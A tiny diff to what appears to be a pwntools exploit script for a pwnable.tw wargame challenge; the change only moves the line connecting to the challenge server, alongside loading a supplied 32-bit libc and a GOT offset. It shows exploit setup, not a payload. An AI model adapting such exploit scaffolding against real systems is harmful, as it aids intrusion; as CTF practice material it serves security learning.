@@ -1,6 +1,6 @@
 from pwn import *
-server = remote('chall.pwnable.tw', 10101)
 
+server = remote('chall.pwnable.tw', 10101)
 libc = ELF('./libc_32.so.6')
 #readelf -S libc_32.so.6
 got_plt_offset = 0x1b0000
